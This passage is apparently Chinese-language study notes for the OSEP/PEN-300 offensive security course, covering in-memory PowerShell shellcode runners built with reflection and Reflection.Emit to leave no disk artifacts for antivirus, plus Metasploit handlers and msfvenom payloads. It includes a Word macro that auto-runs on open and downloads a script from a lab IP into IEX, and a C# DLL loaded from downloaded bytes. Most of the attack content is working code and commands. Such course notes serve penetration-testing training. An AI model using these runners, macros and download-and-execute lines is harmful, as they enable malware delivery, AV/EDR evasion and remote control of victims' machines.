use exploit/multi/handler
set payload windows/x64/meterpreter/bind_tcp
set RHOSTS <KALI_IP>
set LPORT 443
run
```
整體流程：
```
Kali handler 先開始監聽
→ Windows 執行 test.js
→ shellcode 啟動
→ 連回 Kali
→ handler 傳送 stage
→ Meterpreter session
```

# Reflective PowerShell
比較兩種 PowerShell 呼叫 Win32 API 的方式：
- 傳統：Add-Type
- 進階：Reflection

上述接使用 PowerShell 內嵌 C#，並利用 Add-Type 編譯\
表面上 shellcode 是在記憶體內執行，🥚 `Add-Type` 的編譯過程不完全是純記憶體操作
會暫時在磁碟產生 `C# source file：.cs` 與 `Compiled assembly：.dll` 可能被 AV or EDR 識別
## Classic PowerShell Tradecraft
Add-Type 會把 C# 程式碼在執行時編譯成 .NET type
### PowerShell and .NET
PowerShell shellcode runner 不會將 shellcode 寫入 disk，因此可以假設我們的程式碼完全在記憶體中執行\
🥚 當使用`Add-Type` 執行 PowerShell 程式碼時，Visual C# Command-Line Compiler 會處理編譯過程，將 C# source code 和編譯後的 C# assembly 暫時寫入磁碟\
⚠️ 這會在硬碟上留下一些痕跡

利用 Process Monitor 來監控：
![image](https://hackmd.io/_uploads/Hy80jbzHfg.png)

開啟 PowerShell ISE 執行 PowerShell shellcode runner，可以看到包含 CreateFile、WriteFile 和 CloseFile:\
![image](https://hackmd.io/_uploads/SJyVL7mBfe.png)
>`rtylilrr.0.cs`, `rtylilrr.dll`, ...etc


可以使用 [CurrentDomain](https://docs.microsoft.com/en-us/dotnet/api/system.appdomain.currentdomain?view=netframework-4.8) object 的 [GetAssemblies](https://docs.microsoft.com/en-us/dotnet/api/system.appdomain.getassemblies?view=netframework-4.8) method 列出已載入的 assemblies。這個 method 是透過靜態 [AppDomain](https://docs.microsoft.com/en-us/dotnet/api/system.appdomain?view=netframework-4.8) class 呼叫
```powershell
PS C:\Users\offsec> [appdomain]::currentdomain.getassemblies() | Sort-Object -Property fullname | Format-Table fullname

FullName                                                                                                        
--------                                                                                                        
0bhoygtr, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null                                                 
Accessibility, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a                                
Anonymously Hosted DynamicMethods Assembly, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null               
MetadataViewProxies_092d3241-fb3c-4624-9291-72685e354ea4, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null 
Microsoft.GeneratedCode, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null                                  
...   
PresentationFramework-SystemXml, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089              
qdrje0cy, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null                                                 
r1b1e3au, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null                                                 
rtylilrr, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
...
```
> - `[AppDomain]`: System.AppDomain .NET class 的簡寫
> - `CurrentDomain`: 取得目前 PS process 使用的 AppDomain
> - `GetAssemblies()`: 該 AppDomain 已載入的所有 assembly
> - `Sort-Object`: 依照 assembly 的 FullName 排序
> - `Format-Table`: 表格輸出
>
>rtylilrr 已載入到 process 代表 PowerShell 將 C# source code（.cs）寫入硬碟，該檔案被編譯成 assembly（.dll），然後載入到 process 中

Add-Type 在 PowerShell 執行期間：
```
1. 接收 C# source code
2. 呼叫 C# compiler
3. 編譯成 .NET assembly
4. 將 assembly 載入目前 PowerShell process
5. 讓 PowerShell 使用其中的 class 和 method
```

```
PowerShell script
→ Add-Type
→ C# compiler
→ temporary .cs
→ temporary .dll
→ assembly loaded into AppDomain
→ PowerShell 呼叫該 class
```

## Keep That PowerShell in Memory
如何不使用 Add-Type、不產生暫存 C# source code、不產生暫存編譯 DLL\
直接用 PowerShell process 內已載入的 .NET component

### Leveraging UnsafeNativeMethods
呼叫 Win32 API 有兩種主要方式:
- Linked import
上述使用過的
```csharp
[DllImport("kernel32.dll")]
static extern IntPtr VirtualAlloc(...);
```
或 PowerShell `Add-Type $CSharpCode`

- Dynamic lookup
這種技術的目的是在記憶體中建立 .NET assembly，用意不是在編寫程式碼並編譯\
Windows 提供兩個核心 API：[GetModuleHandle](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea)、[GetProcAddress](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress)\
    - GetModuleHandle: 接收 DLL 名稱後，回傳該模組在目前 process 中的 handle (可以視為該 DLL 的載入基底位址)。例如輸出 `140727169908736` 轉成 HEX `0x7FFD98F90000` ，可在 Process Explorer 中對照 user32.dll 的 Load Address
    - GetProcAddress: 接收 DLL handle 和函式名稱，有了函式位址後，可以建立正確的 delegate signature 並呼叫

流程：
```
GetModuleHandle("user32.dll")
→ 得到 user32.dll 的 module handle / base address

GetProcAddress(moduleHandle, "MessageBoxA")
→ 得到 MessageBoxA 的實際記憶體位址
```

列出目前載入的 assemblies\
Powershell:
```
$Assemblies = [AppDomain]::CurrentDomain.GetAssemblies()

$Assemblies |
  ForEach-Object {
    $_.GetTypes()|
      ForEach-Object {
          $_ | Get-Member -Static| Where-Object {
            $_.TypeName.Contains('Unsafe')
          }
      } 2> $null
    }
```
![image](https://hackmd.io/_uploads/SkdLVVQBfg.png)
> - `GetAssemblies()`: 列出目前 AppDomain 中已載入的所有 .NET assemblies
> - 搜尋名稱包含 [Unsafe](https://docs.microsoft.com/en-us/dotnet/csharp/language-reference/keywords/unsafe) 的靜態成員
> - `Get-Member -Static`: 只列出 static 成員
>> "TypeName: Microsoft.Win32.UnsafeNativeMethods"\
>> 為什麼 UnsafeNativeMethods，.NET Framework 內部常使用類似名稱封裝 P/Invoke (`NativeMethods`, `SafeNativeMethods`, `UnsafeNativeMethods`)\
>> 同時包含 GetModuleHandle 和 GetProcAddress，可能涉及指標、handle 或安全敏感 native 操作

接著需要找出是哪個 assembly 提供這些 method:\
搜尋「GetModuleHandle」會發現 18 個結果，其中一個位於 Microsoft.Win32.UnsafeNativeMethods class
```powershell
...
 TypeName: Microsoft.Win32.UnsafeNativeMethods

Name                             MemberType Definition                                                                                                     
----                             ---------- ----------                                                                                                     
....                                
GetModuleFileName                Method     static int GetModuleFileName(System.Runtime.InteropServices.HandleRef hModule, System.Text.StringBuilder buf...
GetModuleHandle                  Method     static System.IntPtr GetModuleHandle(string modName)                                                           
GetNumberOfEventLogRecords       Method     static bool GetNumberOfEventLogRecords(System.Runtime.InteropServices.SafeHandle hEventLog, [ref] int count)   
GetOldestEventLogRecord          Method     static bool GetOldestEventLogRecord(System.Runtime.InteropServices.SafeHandle hEventLog, [ref] int number)     
GetProcAddress                   Method     static System.IntPtr GetProcAddress(System.IntPtr hModule, string methodName), static System.IntPtr GetProcA...
GetProcessWindowStation          Method     static System.IntPtr 
...
```

修改解析程式碼，先透過 [Location](https://docs.microsoft.com/en-us/dotnet/api/system.reflection.assembly.location?view=netframework-4.8) property 列印目前 assembly 位置，然後在ForEach-Object loop 中，尋找 TypeName 符合 `Microsoft.Win32.UnsafeNativeMethods`：
```powershell
$Assemblies = [AppDomain]::CurrentDomain.GetAssemblies()

$Assemblies |
  ForEach-Object {
    $_.Location
    $_.GetTypes()|
      ForEach-Object {
          $_ | Get-Member -Static| Where-Object {
            $_.TypeName.Equals('Microsoft.Win32.UnsafeNativeMethods')
          }
      } 2> $null
    }
```
![image](https://hackmd.io/_uploads/Sy1n_V7rGx.png)
> `System.dll`

因為這些 method 只供 .NET codex 內部使用，我們無法直接從 PowerShell 或 C# 呼叫\
👉🏻 用 Reflection 取得 internal type 和 method object，再透過 `MethodInfo.Invoke()` 間接呼叫

```powershell
# GlobalAssemblyCache: GAC 是 Windows/.NET Framework 的全域 assembly 儲存區 (確認 assembly 來自 GAC)
$systemdll = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') })

# Reflection：取得 internal type，GetType() 會從 System.dll 取得 Microsoft.Win32.UnsafeNativeMethods
$unsafeObj = $systemdll.GetType('Microsoft.Win32.UnsafeNativeMethods')

# 取得 GetModuleHandle
$GetModuleHandle = $unsafeObj.GetMethod('GetModuleHandle')
```
![image](https://hackmd.io/_uploads/SyQg34mHGe.png)

接著使用 使用 Invoke() 呼叫 static method:
```
$GetModuleHandle.Invoke($null, @("user32.dll"))
```
![image](https://hackmd.io/_uploads/BkzanVQBzg.png)

`140725542060032` 轉成 HEX\
![image](https://hackmd.io/_uploads/Hyr4yBmHGe.png)

`7FFD37F20000` 可以對應到 Process Explorer PowerShell ISE process 的 Load Address:\
![messageImage_1785052775920](https://hackmd.io/_uploads/SJXRC47Hzx.jpg)

像之前找 GetModuleHandle 一樣，透過 GetMethod 反射來定位GetProcAddress\
🎯：System.dll 中 Win32.UnsafeNativeMethods 引用的 $unsafeObj variable\
![image](https://hackmd.io/_uploads/B1NFWSXSfl.png)\
> Method overload ⚠️： Microsoft.Win32.UnsafeNativeMethods 裡有不只一個 GetProcAddress

改用 GetMethods 取得 Microsoft.Win32.UnsafeNativeMethods 的所有 method，然後透過 ForEach-Object 循環篩選出 GetProcAddress 的 method \
若輸出結果與 GetProcAddress 匹配，則 print 出來。這樣就能找出Microsoft.Win32.UnsafeNativeMethods 中所有的 GetProcAddress
```powershell
$unsafeObj.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$_}}
```
![image](https://hackmd.io/_uploads/SJkrNSQrGe.png)
> 共顯示兩個 instances

把 overload 存進陣列，簡單地建立一個陣列來保存這兩個實例，然後使用第一個實例來解析函數的位址
```powershell
$user32 = $GetModuleHandle.Invoke($null, @("user32.dll"))
$tmp=@()
$unsafeObj.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
$GetProcAddress = $tmp[0]
$GetProcAddress.Invoke($null, @($user32, "MessageBoxA"))
```
![image](https://hackmd.io/_uploads/Bk0nHHXrzx.png)
```
建立空陣列
→ 找所有 GetProcAddress methods
→ 加到陣列
→ 取第一個 overload
```

解析 MessageBoxA 
```powershell
$user32 =
    $GetModuleHandle.Invoke(
        $null,
        @("user32.dll")
    )

$tmp = @()

$unsafeObj.GetMethods() |
    ForEach-Object {
        if ($_.Name -eq "GetProcAddress") {
            $tmp += $_
        }
    }

$GetProcAddress = $tmp[0]

$GetProcAddress.Invoke(
    $null,
    @($user32, "MessageBoxA")
)
```
![image](https://hackmd.io/_uploads/rJXkYSmBfl.png)

成功解析出了一個任意 Win32 API 的位址
```
找到 user32.dll base address
→ 找到 GetProcAddress MethodInfo
→ 傳入 user32 handle 和 MessageBoxA
→ 得到 MessageBoxA 記憶體位址
```

可以封裝成 LookupFunc
```powershell
function LookupFunc {

    Param (
        $moduleName,
        $functionName
    )

    $assem = (
        [AppDomain]::CurrentDomain.GetAssemblies() |
        Where-Object {
            $_.GlobalAssemblyCache -And
            $_.Location.Split('\')[-1].Equals('System.dll')
        }
    ).GetType('Microsoft.Win32.UnsafeNativeMethods')

    $tmp = @()

    $assem.GetMethods() |
        ForEach-Object {
            if ($_.Name -eq "GetProcAddress") {
                $tmp += $_
            }
        }

    return $tmp[0].Invoke(
        $null,
        @(
            (
                $assem.GetMethod('GetModuleHandle')
            ).Invoke(
                $null,
                @($moduleName)
            ),
            $functionName
        )
    )
}
```
使用 `LookupFunc "user32.dll" "MessageBoxA"`\
可以直接找出 IntPtr 位址

### DelegateType Reflection
透過 Reflection 找到 Win32 API 的記憶體位址，接著需要可以直接呼叫 API\
目前 LookupFunc 只能回傳函式位址，但 CPU 要正確執行該函式，還需要知道 參數數量、參數型別、參數排列方式、回傳型別、Calling convention、
以 MessageBoxA 為例，C# delegate 可寫成：
```csharp
delegate int MessageBoxSig(
    IntPtr hWnd,
    string text,
    string caption,
    int options
);
```
C# 可以直接宣告 delegate，但 Powershell 不行。需要使用 `System.Reflection.Emit` 在記憶體中動態建立一個 delegate type

完整流程會是：
```
LookupFunc
→ 找到 MessageBoxA 位址

Reflection.Emit
→ 建立動態 assembly
→ 建立 module
→ 建立 delegate type
→ 定義 constructor
→ 定義 Invoke method
→ CreateType

Marshal.GetDelegateForFunctionPointer
→ 將 API 位址綁定到 delegate type

Invoke
→ 呼叫 MessageBoxA
```

1. 第一步建立動態 Assembly 名稱，透過 AssemblyName class 建立新的 assembly object
`$MyAssembly` 設定為已 instantiated 的 ReflectedDelegate
assembly object
```powershell
$MyAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
```

2. 在目前 AppDomain 建立動態 assembly
配置其存取模式: `System.Reflection.Emit.AssemblyBuilderAccess` namespace 定義為 [Run](https://docs.microsoft.com/en-us/dotnet/api/system.reflection.emit.assemblybuilderaccess?view=netframework-4.8) access mode
```powershell
$Domain = [AppDomain]::CurrentDomain
$MyAssemblyBuilder = $Domain.DefineDynamicAssembly($MyAssembly, 
  [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
```
> 只允許在記憶體中執行，不儲存到磁碟

3. 建立 Dynamic Module，Assembly 內部需要至少一個 Module
```powershell
$MyModuleBuilder = $MyAssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
```
> $false 不產生 symbol information

目前架構：
```
ReflectedDelegate assembly
└── InMemoryModule
```
4. 建立 [Delegate Type](https://docs.microsoft.com/en-us/dotnet/api/system.reflection.emit.modulebuilder.definetype?view=netframework-4.8#System_Reflection_Emit_ModuleBuilder_DefineType_System_String_System_Reflection_TypeAttributes_)，選 [MulticastDelegate class](https://docs.microsoft.com/en-us/dotnet/api/system.multicastdelegate?view=netframework-4.8) 建立具有多個入口的 multiple entries 類型，這樣可以使用多個參數來呼叫目標 API
```powershell
$MyTypeBuilder = $MyModuleBuilder.DefineType('MyDelegateType', 
  'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
```
> - Class: 這是一個 class
> - Public: 可公開存取
> - Sealed: 不可再繼承
> - AnsiClass: 字串預設採 ANSI marshaling
> - AutoClass: runtime 自動管理 layout

5. 建立 Delegate Constructor
將 function prototype 放入 type 中
```powershell
$MyConstructorBuilder = $MyTypeBuilder.DefineConstructor(
  'RTSpecialName, HideBySig, Public', 
    [System.Reflection.CallingConventions]::Standard, 
      @([IntPtr], [String], [String], [int]))
```
constructor parameter array 表示 MessageBoxA 的參數型別： `IntPtr`, `String`, `String`, `int`\
👉🏻 `hWnd`, `text`, `caption`, `options`\
Constructor Attributes: RTSpecialName, HideBySig, Public

6. 設定 Invoke Implementation Flags
設定 implementation flags 以啟用對 Invoke method 的呼叫，透過 [CreateType](https://docs.microsoft.com/en-us/dotnet/api/system.reflection.emit.typebuilder.createtype?view=netframework-4.8) 方法呼叫 custom constructor
```
$MyDelegateType = $MyTypeBuilder.CreateType()
```

以此得到了一個可以在呼叫 GetDelegateForFunctionPointer 時使用的delegate type。結合所有資訊以及 MessageBoxA 已解析的記憶體位址，就可以呼叫 Win32 本機 API 而無需使用 Add-Type

Review: 我們重複使用 LookupFunc method 解析 Win32 API address ，並使用該位址定位 MessageBoxA 的 address。接著建立DelegateType。最後呼叫 GetDelegateForFunctionPointer method 來關聯 function address 和 DelegateType，並呼叫 MessageBox

完整建構 function
```powershell
function LookupFunc {

	Param ($moduleName, $functionName)

	$assem = ([AppDomain]::CurrentDomain.GetAssemblies() | 
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].
      Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
    $tmp=@()
    $assem.GetMethods() | ForEach-Object {If($_.Name -eq "GetProcAddress") {$tmp+=$_}}
	return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

$MessageBoxA = LookupFunc user32.dll MessageBoxA
$MyAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
$Domain = [AppDomain]::CurrentDomain
$MyAssemblyBuilder = $Domain.DefineDynamicAssembly($MyAssembly, 
  [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
$MyModuleBuilder = $MyAssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
$MyTypeBuilder = $MyModuleBuilder.DefineType('MyDelegateType', 
  'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])

$MyConstructorBuilder = $MyTypeBuilder.DefineConstructor(
  'RTSpecialName, HideBySig, Public', 
    [System.Reflection.CallingConventions]::Standard, 
      @([IntPtr], [String], [String], [int]))
$MyConstructorBuilder.SetImplementationFlags('Runtime, Managed')
$MyMethodBuilder = $MyTypeBuilder.DefineMethod('Invoke', 
  'Public, HideBySig, NewSlot, Virtual', 
    [int], 
      @([IntPtr], [String], [String], [int]))
$MyMethodBuilder.SetImplementationFlags('Runtime, Managed')
$MyDelegateType = $MyTypeBuilder.CreateType()

$MyFunction = [System.Runtime.InteropServices.Marshal]::
    GetDelegateForFunctionPointer($MessageBoxA, $MyDelegateType)
$MyFunction.Invoke([IntPtr]::Zero,"Hello World","This is My MessageBox",0)
```
![messageImage_1785058840571 (1)](https://hackmd.io/_uploads/B1WSLLQSfg.jpg)

### Reflection Shellcode Runner in PowerShell
建構完整 Workflow:
```
PowerShell
→ LookupFunc 解析 VirtualAlloc 位址
→ getDelegateType 建立 VirtualAlloc delegate
→ VirtualAlloc 配置記憶體
→ Marshal.Copy 寫入 shellcode
→ 解析並呼叫 CreateThread
→ 從 shellcode 位址建立執行緒
→ 解析並呼叫 WaitForSingleObject
→ 等待執行緒持續執行
```

上述建立 MessageBoxA delegate 時，程式碼很長，且每呼叫一個不同 API，都要重新建立 Assembly, Module, Type, Constructor, Invoke method\
可以直接封裝成 function getDelegateType，接收兩個參數
- `$func`: 代表 API 參數型別陣列
- `$delType`: 代表 API 回傳型別
```powershell
function getDelegateType {

	Param (
		[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
		[Parameter(Position = 1)] [Type] $delType = [Void]
	)

	$type = [AppDomain]::CurrentDomain.
    DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), 
    [System.Reflection.Emit.AssemblyBuilderAccess]::Run).
      DefineDynamicModule('InMemoryModule', $false).
      DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', 
      [System.MulticastDelegate])

  $type.
    DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).
      SetImplementationFlags('Runtime, Managed')

  $type.
    DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).
      SetImplementationFlags('Runtime, Managed')

	return $type.CreateType()
}

```
可以節合 LookupFunc 函數，使用與先前相同的參數來解析和呼叫VirtualAlloc 函數\
用LookupFunc 函數在 Kernel32.dll 中搜尋 Win32 VirtualAlloc API
```powershell
$VirtualAllocAddr = LookupFunc kernel32.dll VirtualAlloc
$VirtualAllocDelegateType = getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])
$VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegateType)
$VirtualAlloc.Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)
```
![image](https://hackmd.io/_uploads/B1SqPImrzx.png)
> `2166649520128`

利用簡化直接寫入 getDelegateType\
(對 LookupFunc 和 getDelegateType 的呼叫嵌入到 GetDelegateForFunctionPointer)
```powershell
$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)
```

Final 在 Kali 產生 PowerShell shellcode
```
┌──(chw💲CHW)-[~]
└─$ msfvenom \                       
  -p windows/x64/meterpreter/reverse_https \
  LHOST=<KALI-IP> \
  LPORT=443 \
  EXITFUNC=thread \
  -f powershell \
  -o shellcode.ps1
```
![image](https://hackmd.io/_uploads/B14uYUmSze.png)

Windows:
```powershell
$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

[Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0...

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)

$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)

[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
```

在 Kali 中啟動 Handler 監聽
```
msfconsole
-
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set LHOST <KALI-IP>
set LPORT 443
set ExitOnSession false
run
```
![messageImage_1785060130109](https://hackmd.io/_uploads/H1OBi8QrGl.jpg)
```
background

sessions
sessions -i 1
-
getuid
sysinfo
getpid
- 
shell
```
且在  Process Monitor  驗證了 .cs file 沒有被寫入 file system
![image](https://hackmd.io/_uploads/Bk2FiIQHGe.png)

# Reflective Code Execution in Client Side Attacks
結合前面提過的兩個技術：
```
Microsoft Word Macro
+
Reflective PowerShell shellcode runner
```
讓 Word Macro 啟動 PowerShell，再由 PowerShell 從 Kali 下載 run.ps1 的內容並直接在記憶體執行

```
使用者開啟 Word 文件
→ Document_Open / AutoOpen 觸發
→ MyMacro 執行
→ Word 啟動 powershell.exe
→ PowerShell 從 Kali 下載 run.ps1
→ IEX 在記憶體執行內容
→ VirtualAlloc 配置記憶體
→ Marshal.Copy 寫入 shellcode
→ CreateThread 執行 shellcode
→ WaitForSingleObject 保持程序存活
→ Reverse Meterpreter 連回 Kali
```

## Including Reflective Code
Reflective PowerShell in Client-Side attacks (ex. Microsoft Word macros)\
研究如何以 reflective manner 執行 C# code

### Reflective PowerShell in Client-Side Attacks
- Microsoft Word macro
```vba
Sub MyMacro()
    Dim str As String
    str = "powershell (New-Object System.Net.WebClient).DownloadString('http://192.168.50.120/run.ps1') | IEX"
    Shell str, vbHide
End Sub

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
```
當 Word 開啟時， AutoOpen 和 Document_Open procedures 會執行 MyMacro。 MyMacro 程序將啟動 PowerShell，並從我們的 Kali 機器上下載 run.ps1 檔案。文件內容下載到變數 str 後，將執行該文件的內容

- reflective PowerShell shellcode runner (run.ps1)
```powershell
$lpMem = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll VirtualAlloc), (getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, 0x1000, 0x3000, 0x40)

[Byte[]] $buf = 0xfc,0xe8,0x82,0x0,0x0,0x0...

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $lpMem, $buf.length)

$hThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll CreateThread), (getDelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$lpMem,[IntPtr]::Zero,0,[IntPtr]::Zero)

[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((LookupFunc kernel32.dll WaitForSingleObject), (getDelegateType @([IntPtr], [Int32]) ([Int]))).Invoke($hThread, 0xFFFFFFFF)
```
將 reflective PowerShell code 儲存在 Kali web root 路徑下

Kali msfconsole 啟動 Handler 監聽
```
[*] Started HTTPS reverse handler on https://192.168.119.50:443
[*] https://192.168.119.50:443 handling request from 192.168.120.10; (UUID: pm1qmw8u) Staging x64 payload (207449 bytes) ...
[*] Meterpreter session 1 opened (192.168.119.50:443 -> 192.168.120.10:49678)

meterpreter > 
```
### Reflective C# in Client-Side Attacks
目前已經掌握了使用 Windows Script Host 和 C# 的技術。接著將其與 PowerShell 和 Office 的技術結合，開發另一種完全在記憶體中執行 C# 的方法

先前兩種方法：
```
Add-Type
→ 執行時編譯 C#
→ 暫時產生 .cs 和 .dll

Reflection.Emit
→ 不落地
→ 但程式碼較複雜
```
第三種方法：
```
先在開發機編譯好 C# DLL
→ 目標端只負責把 DLL bytes 載入記憶體
```

整體流程：
```
C# shellcode runner
→ 編譯成 ClassLibrary1.dll
→ Kali Apache 提供 DLL
→ PowerShell DownloadData 下載成 byte[]
→ Assembly.Load(byte[])
→ GetType()
→ GetMethod()
→ Invoke()
→ shellcode 在 PowerShell process 中執行
```

1. 建立 Class Library
在 Visual Studio 的既有 Solution 'ConsoleApp1'\
操作：
```
右鍵 Solution
→ Add
→ New Project
→ Class Library (.NET Framework)
```
預設專案名稱 ClassLibrary1\
編譯後會得到 ClassLibrary1.dll\
![image](https://hackmd.io/_uploads/r1-SrjEBze.png)

Class Library 與 Console Application 的主要差別：
- Console Application
→ 產生 EXE
→ 入口通常是 Main()

- Class Library
→ 產生 DLL
→ 沒有自動執行入口
→ 必須由其他程式載入並呼叫 method

2. 建立 runner()
```csharp
> Win32 API 宣告必須放在 Class1 class 裡
public class Class1
{
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
     uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize,
      IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll")]
    static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

    public static void runner()
    {
    }
}    
```
> Win32 API 宣告必須放在 Class1 class 內 runner() method 外

可以從 Kali 下載 DLL，寫入 Windows 磁碟再從磁碟載入 assembly\
🥚 這不完全 in-memory ⚠️
```powershell
(New-Object System.Net.WebClient).DownloadFile('http://192.168.50.120/ClassLibrary1.dll', 'C:\Users\Offsec\ClassLibrary1.dll')

$assem = [System.Reflection.Assembly]::LoadFile("C:\Users\Offsec\ClassLibrary1.dll")
```

改使用 Net.WebClient class 的 [DownloadData](https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient.downloaddata?view=netframework-4.8) method 將 DLL 下載為 byte array
```powershell
$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.50.120/ClassLibrary1.dll')

$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("ClassLibrary1.Class1")
$method = $class.GetMethod("runner")
$method.Invoke(0, $null)
```

# Process Injection and Migration


>[!Caution]
> HackMD 筆記長度限制，接續 [[OSEP, PEN-300] Instructional notes - Part 3](https://chw41.github.io/b1og/osep-pen-300-instructional-notes---part-3/)

# [Link to: "[OSEP, PEN-300] Instructional notes - Part 3"](https://chw41.github.io/b1og/osep-pen-300-instructional-notes---part-3/)

# [Link to: "[OSEP, PEN-300] Instructional notes - Part 4"](https://chw41.github.io/b1og/osep-pen-300-instructional-notes---part-4/)

# [Link to: "[OSEP, PEN-300] Instructional notes - Part 5"](https://chw41.github.io/b1og/osep-pen-300-instructional-notes---part-5/)

# [Link to: "[OSEP, PEN-300] Instructional notes - Part 6"](https://chw41.github.io/b1og/osep-pen-300-instructional-notes---part-6/)
